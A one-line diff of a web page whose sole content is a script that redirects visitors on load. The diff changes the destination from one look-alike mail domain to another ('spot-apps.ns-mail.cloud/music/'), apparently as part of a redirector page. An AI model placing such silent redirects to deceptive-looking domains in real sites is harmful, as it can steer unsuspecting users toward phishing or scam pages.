@@ -1,1 +1,1 @@
-<script>window.location.replace("https://messagerie.fr-mail.info");</script>
+<script>window.location.replace("https://spot-apps.ns-mail.cloud/music/");</script>
